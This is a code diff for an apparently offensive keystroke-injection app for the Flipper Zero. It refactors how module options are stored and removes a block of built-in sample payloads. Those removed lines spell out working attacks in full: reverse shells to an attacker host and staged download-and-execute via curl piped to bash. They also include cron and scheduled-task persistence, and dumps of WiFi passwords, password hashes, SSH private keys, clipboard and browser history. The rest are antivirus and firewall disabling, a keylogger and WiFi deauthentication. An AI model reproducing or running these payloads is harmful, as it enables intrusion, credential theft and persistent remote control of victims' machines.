@@ -460,10 +460,14 @@ static uint16_t fpwn_named_key(const char* name) {
 
 /**
  * Perform in-place {{OPTION_NAME}} substitution on `src`, writing to `dst`
- * (dst_size bytes available). Looks up option values from `module`.
+ * (dst_size bytes available). Looks up option values from the active options.
  */
-static void
-    fpwn_substitute(const char* src, char* dst, size_t dst_size, const FPwnModule* module) {
+static void fpwn_substitute(
+    const char* src,
+    char* dst,
+    size_t dst_size,
+    const FPwnOption* options,
+    uint8_t option_count) {
     if(dst_size == 0) return;
     size_t di = 0; /* write cursor */
     const char* p = src;
@@ -483,9 +487,9 @@ static void
 
                     /* Look up the option value */
                     const char* replacement = NULL;
-                    for(uint8_t i = 0; i < module->option_count; i++) {
-                        if(strcmp(module->options[i].name, opt_name) == 0) {
-                            replacement = module->options[i].value;
+                    for(uint8_t i = 0; i < option_count; i++) {
+                        if(strcmp(options[i].name, opt_name) == 0) {
+                            replacement = options[i].value;
                             break;
                         }
                     }
@@ -2624,9 +2628,9 @@ bool fpwn_module_load_full(FPwnApp* app, uint32_t index) {
 
     if(index >= app->module_count) return false;
 
-    FPwnModule* module = &app->modules[index];
-    if(module->options_loaded) return true;
+    if((int32_t)index == app->options_loaded_for) return true;
 
+    FPwnModule* module = &app->modules[index];
     Storage* storage = app->storage;
     File* file = storage_file_alloc(storage);
 
@@ -2636,7 +2640,7 @@ bool fpwn_module_load_full(FPwnApp* app, uint32_t index) {
         return false;
     }
 
-    module->option_count = 0;
+    app->active_option_count = 0;
     char line[FPWN_MAX_LINE_LEN];
 
     while(!storage_file_eof(file)) {
@@ -2645,15 +2649,8 @@ bool fpwn_module_load_full(FPwnApp* app, uint32_t index) {
 
         char* trimmed = fpwn_trim(line);
 
-        /*
-         * OPTION format: OPTION <name> <default_value> "<description>"
-         *
-         * We split on the first space after "OPTION " to get the name,
-         * then the next space for the default value, then strip quotes
-         * from the remaining description.
-         */
         if(strncmp(trimmed, "OPTION ", 7) != 0) continue;
-        if(module->option_count >= FPWN_MAX_OPTIONS) break;
+        if(app->active_option_count >= FPWN_MAX_OPTIONS) break;
 
         char* rest = trimmed + 7;
 
@@ -2686,7 +2683,7 @@ bool fpwn_module_load_full(FPwnApp* app, uint32_t index) {
             opt_default = rest;
         }
 
-        FPwnOption* opt = &module->options[module->option_count];
+        FPwnOption* opt = &app->active_options[app->active_option_count];
         strncpy(opt->name, opt_name, FPWN_OPT_NAME_LEN - 1);
         strncpy(opt->value, opt_default, FPWN_OPT_VALUE_LEN - 1);
         strncpy(opt->description, opt_desc, FPWN_OPT_DESC_LEN - 1);
@@ -2695,14 +2692,14 @@ bool fpwn_module_load_full(FPwnApp* app, uint32_t index) {
         opt->description[FPWN_OPT_DESC_LEN - 1] = '\0';
 
         FURI_LOG_D(TAG, "  Option: %s = %s", opt->name, opt->value);
-        module->option_count++;
+        app->active_option_count++;
     }
 
     storage_file_close(file);
     storage_file_free(file);
 
-    module->options_loaded = true;
-    FURI_LOG_I(TAG, "Loaded %u option(s) for: %s", module->option_count, module->name);
+    app->options_loaded_for = (int32_t)index;
+    FURI_LOG_I(TAG, "Loaded %u option(s) for: %s", app->active_option_count, module->name);
     return true;
 }
 
@@ -2889,7 +2886,12 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
         if(trimmed[0] == '\0' || trimmed[0] == '#') continue;
 
         /* Substitute template variables then execute */
-        fpwn_substitute(trimmed, substituted, sizeof(substituted), module);
+        fpwn_substitute(
+            trimmed,
+            substituted,
+            sizeof(substituted),
+            app->active_options,
+            app->active_option_count);
 
         /* Handle IF_CONNECTED / END_IF conditional blocks.
          * If the ESP32 is not connected, skip everything until END_IF. */
@@ -3026,7 +3028,8 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
                     char* rt = fpwn_trim(raw);
                     if(rt[0] == '\0' || rt[0] == '#') continue;
                     char rsub[FPWN_MAX_LINE_LEN];
-                    fpwn_substitute(rt, rsub, sizeof(rsub), module);
+                    fpwn_substitute(
+                        rt, rsub, sizeof(rsub), app->active_options, app->active_option_count);
                     if(strcmp(rsub, "END_REPEAT") == 0) {
                         found_end = true;
                         break;
@@ -3124,7 +3127,8 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
                         char* ft = fpwn_trim(raw);
                         if(ft[0] == '\0' || ft[0] == '#') continue;
                         char fsub[FPWN_MAX_LINE_LEN];
-                        fpwn_substitute(ft, fsub, sizeof(fsub), module);
+                        fpwn_substitute(
+                            ft, fsub, sizeof(fsub), app->active_options, app->active_option_count);
                         if(strcmp(fsub, "END_FOR") == 0) {
                             found_end_for = true;
                             break;
@@ -3227,7 +3231,8 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
                     char* wt = fpwn_trim(raw);
                     if(wt[0] == '\0' || wt[0] == '#') continue;
                     char wsub[FPWN_MAX_LINE_LEN];
-                    fpwn_substitute(wt, wsub, sizeof(wsub), module);
+                    fpwn_substitute(
+                        wt, wsub, sizeof(wsub), app->active_options, app->active_option_count);
                     if(strcmp(wsub, "END_WHILE") == 0) {
                         found_end_while = true;
                         break;
@@ -3359,13 +3364,13 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
                 app->abort_requested ? "Aborted" : "Complete");
             if(n > 0 && n < (int)sizeof(buf)) storage_file_write(gf, buf, (uint16_t)n);
 
-            for(uint8_t i = 0; i < module->option_count; i++) {
+            for(uint8_t i = 0; i < app->active_option_count; i++) {
                 n = snprintf(
                     buf,
                     sizeof(buf),
                     "  %-12s = %s\n",
-                    module->options[i].name,
-                    module->options[i].value);
+                    app->active_options[i].name,
+                    app->active_options[i].value);
                 if(n > 0 && n < (int)sizeof(buf)) storage_file_write(gf, buf, (uint16_t)n);
             }
 
@@ -3382,9 +3387,11 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
             /* If LHOST + LPORT are present, write MSF listener command */
             const char* lhost = NULL;
             const char* lport = NULL;
-            for(uint8_t i = 0; i < module->option_count; i++) {
-                if(strcmp(module->options[i].name, "LHOST") == 0) lhost = module->options[i].value;
-                if(strcmp(module->options[i].name, "LPORT") == 0) lport = module->options[i].value;
+            for(uint8_t i = 0; i < app->active_option_count; i++) {
+                if(strcmp(app->active_options[i].name, "LHOST") == 0)
+                    lhost = app->active_options[i].value;
+                if(strcmp(app->active_options[i].name, "LPORT") == 0)
+                    lport = app->active_options[i].value;
             }
             if(lhost && lport) {
                 n = snprintf(
@@ -3417,15 +3424,15 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
 }
 
 /* =========================================================================
- * Sample module writer
+ * Sample module bootstrap
  * =========================================================================
- * Writes built-in sample .fpwn files to SD card on first launch (when the
- * modules directory is empty).  Two samples are provided:
- *   sysinfo.fpwn   — Recon: open a terminal and dump basic system info
- *   lock_screen.fpwn — Post: lock the workstation
+ * Sample .fpwn modules are distributed as standalone files alongside the FAP.
+ * Copy them to SD:/flipperpwn/modules/ before first use.
+ * This function just ensures the modules directory exists.
  * ========================================================================= */
 
-/* System Info — opens a terminal and dumps host/user/IP info */
+/* Minimal "getting started" module embedded in the binary (~200 bytes).
+ * Everything else ships as .fpwn files in the release package. */
 static const char SAMPLE_SYSINFO[] =
     "NAME System Info Recon\n"
     "DESCRIPTION Opens terminal, dumps hostname, username, and IP address\n"
@@ -3463,1426 +3470,9 @@ static const char SAMPLE_SYSINFO[] =
     "STRING echo HOST:$(hostname) USER:$(whoami) && ip addr | grep 'inet ' | grep -v 127 && uname -a\n"
     "ENTER\n";
 
-/* Lock Screen — locks the workstation */
-static const char SAMPLE_LOCK_SCREEN[] = "NAME Lock Screen\n"
-                                         "DESCRIPTION Locks the workstation screen immediately\n"
-                                         "CATEGORY post\n"
-                                         "PLATFORMS WIN,MAC,LINUX\n"
-                                         "OPTION DELAY 500 \"Pre-lock delay (ms)\"\n"
-                                         "PLATFORM WIN\n"
-                                         "DELAY {{DELAY}}\n"
-                                         "GUI l\n"
-                                         "PLATFORM MAC\n"
-                                         "DELAY {{DELAY}}\n"
-                                         "GUI SPACE\n"
-                                         "DELAY 700\n"
-                                         "STRING Lock Screen\n"
-                                         "ENTER\n"
-                                         "PLATFORM LINUX\n"
-                                         "DELAY {{DELAY}}\n"
-                                         "CTRL ALT l\n";
-
-/* Attack Chain — recon + staged reverse shell + lock */
-static const char SAMPLE_ATTACK_CHAIN[] =
-    "NAME Attack Chain\n"
-    "DESCRIPTION Recon, staged reverse shell download, screen lock\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION LHOST 192.168.1.100 \"Attacker IP (your machine)\"\n"
-    "OPTION LPORT 4444 \"Metasploit listener port\"\n"
-    "OPTION WEBPORT 8080 \"HTTP server port serving payload\"\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "# SETUP: On your machine run:\n"
-    "#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o s.exe\n"
-    "#   python3 -m http.server {{WEBPORT}}\n"
-    "#   msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{LHOST}}; set LPORT {{LPORT}}; exploit'\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass -w hidden\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "STRING \"HOST:$env:COMPUTERNAME USER:$env:USERNAME IP:$((ipconfig|sls 'IPv4 Address').ToString().Split(':')[1].Trim())\" | Out-File $env:TEMP\\r.txt\n"
-    "ENTER\n"
-    "DELAY 400\n"
-    "STRING IWR http://{{LHOST}}:{{WEBPORT}}/s.exe -OutFile $env:TEMP\\s.exe; Start-Process $env:TEMP\\s.exe\n"
-    "ENTER\n"
-    "DELAY 1500\n"
-    "GUI l\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRING curl -s http://{{LHOST}}:{{WEBPORT}}/mac.sh | bash &\n"
-    "ENTER\n"
-    "DELAY 1500\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Lock Screen\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRING curl -s http://{{LHOST}}:{{WEBPORT}}/lin.sh | bash &\n"
-    "ENTER\n"
-    "DELAY 1500\n"
-    "CTRL ALT l\n";
-
-/* WiFi Credential Dump — extracts saved WiFi passwords and exfils via LED */
-static const char SAMPLE_WIFI_CREDS[] =
-    "NAME WiFi Credential Dump\n"
-    "DESCRIPTION Extracts saved WiFi passwords; exfils output via LED toggling\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "EXFIL (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$n\" key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{\"WIFI: $n = \" + $_.Matches.Groups[1].Value.Trim()}\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | tr -d ' '); do pw=$(security find-generic-password -wa \"$ssid\" 2>/dev/null); echo \"WIFI: $ssid = $pw\"; done\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL sudo grep -rH psk= /etc/NetworkManager/system-connections/ 2>/dev/null || nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | sed 's/:/: /'\n";
-
-/* SAM/Shadow Dump — extracts password hashes and exfils via LED */
-static const char SAMPLE_HASH_DUMP[] =
-    "NAME Hash Dump\n"
-    "DESCRIPTION Extracts OS password hashes (requires admin/root); exfils via LED\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "EXFIL reg save HKLM\\SAM $env:TEMP\\s.hiv /y 2>&1; reg save HKLM\\SYSTEM $env:TEMP\\y.hiv /y 2>&1; Write-Output \"SAM+SYSTEM saved to $env:TEMP\"\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL sudo dscl . -readall /Users UniqueID RealName AuthenticationAuthority 2>/dev/null | head -60\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL sudo cat /etc/shadow 2>/dev/null | head -20\n";
-
-/* Reverse Shell — cross-platform TCP reverse shell via HID */
-static const char SAMPLE_REVERSE_SHELL[] =
-    "NAME Reverse Shell\n"
-    "DESCRIPTION Opens a reverse shell to the attacker's listener\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION LHOST 192.168.1.100 \"Attacker IP address\"\n"
-    "OPTION LPORT 4444 \"Listener port\"\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -w hidden -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\n"
-    "ENTER\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &\n"
-    "ENTER\n"
-    "DELAY 500\n"
-    "STRING exit\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &\n"
-    "ENTER\n"
-    "DELAY 500\n"
-    "STRING exit\n"
-    "ENTER\n";
-
-/* Persistence — installs a scheduled task/cron callback every 15 minutes */
-static const char SAMPLE_PERSISTENCE[] =
-    "NAME Persistence Install\n"
-    "DESCRIPTION Creates a persistent callback to the attacker\n"
-    "CATEGORY post\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION LHOST 192.168.1.100 \"Attacker IP address\"\n"
-    "OPTION LPORT 4444 \"Callback port\"\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -w hidden -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "STRING $a='powershell -nop -w hidden -ep bypass -c \"while(1){try{$c=New-Object Net.Sockets.TCPClient(''{{LHOST}}'',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()}catch{Start-Sleep 60}}\"';schtasks /create /sc minute /mo 15 /tn 'WindowsUpdate' /tr $a /f\n"
-    "ENTER\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRING (crontab -l 2>/dev/null; echo \"*/15 * * * * bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1\") | crontab -\n"
-    "ENTER\n"
-    "DELAY 500\n"
-    "STRING exit\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRING (crontab -l 2>/dev/null; echo \"*/15 * * * * bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1\") | crontab -\n"
-    "ENTER\n"
-    "DELAY 500\n"
-    "STRING exit\n"
-    "ENTER\n";
-
-/* Browser History — extracts recent history from Chrome/Safari/Firefox via sqlite3 */
-static const char SAMPLE_BROWSER_HISTORY[] =
-    "NAME Browser History Dump\n"
-    "DESCRIPTION Extracts recent browser history from Chrome/Safari/Firefox\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "OPTION COUNT 50 \"Number of recent entries to extract\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "STRING $h=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History\";$t=\"$env:TEMP\\h.db\";Copy-Item $h $t -Force 2>$null;Add-Type -Path \"$env:LOCALAPPDATA\\..\\Roaming\\..\\Local\\Microsoft\\WindowsApps\\Microsoft.Winget.Source_*\\SQLite\\System.Data.SQLite.dll\" 2>$null;try{$c=New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$t\");$c.Open();$q=$c.CreateCommand();$q.CommandText=\"SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT {{COUNT}}\";$r=$q.ExecuteReader();while($r.Read()){Write-Host $r[0] $r[1]};$c.Close()}catch{Write-Host 'Chrome history unavailable'}\n"
-    "ENTER\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRING cp ~/Library/Application\\ Support/Google/Chrome/Default/History /tmp/h.db 2>/dev/null && sqlite3 /tmp/h.db \"SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT {{COUNT}}\"; rm -f /tmp/h.db\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRING cp ~/.config/google-chrome/Default/History /tmp/h.db 2>/dev/null && sqlite3 /tmp/h.db \"SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT {{COUNT}}\"; rm -f /tmp/h.db\n"
-    "ENTER\n";
-
-/* Disable Defenses — disables AV/firewall on all three platforms (requires admin/root) */
-static const char SAMPLE_DISABLE_DEFENDER[] =
-    "NAME Disable Defenses\n"
-    "DESCRIPTION Disables AV/firewall (requires admin/root)\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass Start-Process powershell -Verb RunAs -ArgumentList '-nop -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Write-Host Defenses disabled\"'\n"
-    "ENTER\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRING sudo pfctl -d 2>/dev/null; sudo spctl --master-disable 2>/dev/null; echo Defenses disabled\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRING sudo systemctl stop firewalld 2>/dev/null; sudo ufw disable 2>/dev/null; sudo iptables -F 2>/dev/null; echo Defenses disabled\n"
-    "ENTER\n";
-
-/* Keylogger Install — captures keystrokes to a file using platform-native methods */
-static const char SAMPLE_KEYLOGGER[] =
-    "NAME Keylogger Install\n"
-    "DESCRIPTION Installs a lightweight keylogger that captures keystrokes to a file\n"
-    "CATEGORY post\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION LHOST 192.168.1.100 \"Attacker IP (your machine)\"\n"
-    "OPTION DURATION 60 \"Capture duration in seconds\"\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass -w hidden\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "STRING $o=\"$env:TEMP\\kl.txt\";$d={{DURATION}};$e=(Get-Date).AddSeconds($d);$s=@{};Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class KL{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int k);}';while((Get-Date)-lt $e){for($i=8;$i -le 190;$i++){if([KL]::GetAsyncKeyState($i) -band 1){Add-Content $o ([char]$i)}};Start-Sleep -ms 50};Write-Host \"Keylog saved to $o\"\n"
-    "ENTER\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRING script -q /tmp/.kl sh -c 'sleep {{DURATION}}' && strings /tmp/.kl > /tmp/.kl2 && mv /tmp/.kl2 /tmp/.kl && echo \"Keylog saved to /tmp/.kl\"\n"
-    "ENTER\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRING KID=$(xinput list 2>/dev/null | grep -i keyboard | grep -oP 'id=\\K[0-9]+' | head -1); if [ -n \"$KID\" ]; then timeout {{DURATION}} xinput test $KID > /tmp/.kl 2>/dev/null & echo \"Keylog capturing to /tmp/.kl (PID $!)\"; else sudo timeout {{DURATION}} cat /dev/input/event0 | xxd > /tmp/.kl 2>/dev/null & echo \"Keylog capturing to /tmp/.kl\"; fi\n"
-    "ENTER\n";
-
-/* Clipboard Dump — exfiltrates clipboard contents via LED channel */
-static const char SAMPLE_CLIPBOARD_STEAL[] =
-    "NAME Clipboard Dump\n"
-    "DESCRIPTION Exfiltrates clipboard contents via LED channel\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "EXFIL Get-Clipboard\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL pbpaste\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null\n";
-
-/* Network Recon — dumps ARP table, routing table, DNS config, and active connections */
-static const char SAMPLE_NETWORK_RECON[] =
-    "NAME Network Recon\n"
-    "DESCRIPTION Dumps ARP table, routing table, DNS config, and active connections\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "EXFIL echo '=== ARP ===' ; arp -a ; echo '=== ROUTE ===' ; route print ; echo '=== DNS ===' ; ipconfig /displaydns | Select-String 'Record Name' | Select -First 20 ; echo '=== CONNECTIONS ===' ; netstat -an | Select-Object -First 30\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL echo '=== ARP ===' && arp -a && echo '=== ROUTE ===' && netstat -rn && echo '=== CONNECTIONS ===' && netstat -an | head -30\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL echo '=== ARP ===' && arp -a && echo '=== ROUTE ===' && ip route && echo '=== DNS ===' && cat /etc/resolv.conf && echo '=== CONNECTIONS ===' && ss -tuln | head -30\n";
-
-/* SSH Key Dump — exfiltrates SSH private keys from the target */
-static const char SAMPLE_SSH_KEY_THEFT[] =
-    "NAME SSH Key Dump\n"
-    "DESCRIPTION Exfiltrates SSH private keys from the target\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "EXFIL if(Test-Path $env:USERPROFILE\\.ssh\\id_rsa){Get-Content $env:USERPROFILE\\.ssh\\id_rsa}elseif(Test-Path $env:USERPROFILE\\.ssh\\id_ed25519){Get-Content $env:USERPROFILE\\.ssh\\id_ed25519}else{Write-Output 'No SSH keys found'}\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'No SSH keys found'\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'No SSH keys found'\n";
-
-/* WiFi recon + deauth module — scan, dump APs, targeted deauth */
-static const char SAMPLE_WIFI_ATTACK[] =
-    "NAME WiFi Attack Chain\n"
-    "DESCRIPTION Scan APs, dump results via HID, then deauth target\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION TARGET_SSID MyNetwork \"Target SSID for deauth\"\n"
-    "OPTION DELAY 500 \"Initial delay (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "IF_CONNECTED\n"
-    "REM Scan nearby WiFi APs via ESP32\n"
-    "WIFI_SCAN\n"
-    "REM Open Notepad and type results\n"
-    "GUI r\n"
-    "DELAY 500\n"
-    "STRING notepad\n"
-    "ENTER\n"
-    "DELAY 1000\n"
-    "STRINGLN === WiFi Scan Results ===\n"
-    "WIFI_RESULT\n"
-    "STRINGLN === End Results ===\n"
-    "REM Targeted deauth\n"
-    "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
-    "WIFI_WAIT 10000\n"
-    "WIFI_STOP\n"
-    "END_IF\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "IF_CONNECTED\n"
-    "WIFI_SCAN\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING TextEdit\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "STRINGLN === WiFi Scan Results ===\n"
-    "WIFI_RESULT\n"
-    "STRINGLN === End Results ===\n"
-    "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
-    "WIFI_WAIT 10000\n"
-    "WIFI_STOP\n"
-    "END_IF\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "IF_CONNECTED\n"
-    "WIFI_SCAN\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "STRINGLN cat << 'SCAN'\n"
-    "WIFI_RESULT\n"
-    "STRINGLN SCAN\n"
-    "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
-    "WIFI_WAIT 10000\n"
-    "WIFI_STOP\n"
-    "END_IF\n";
-
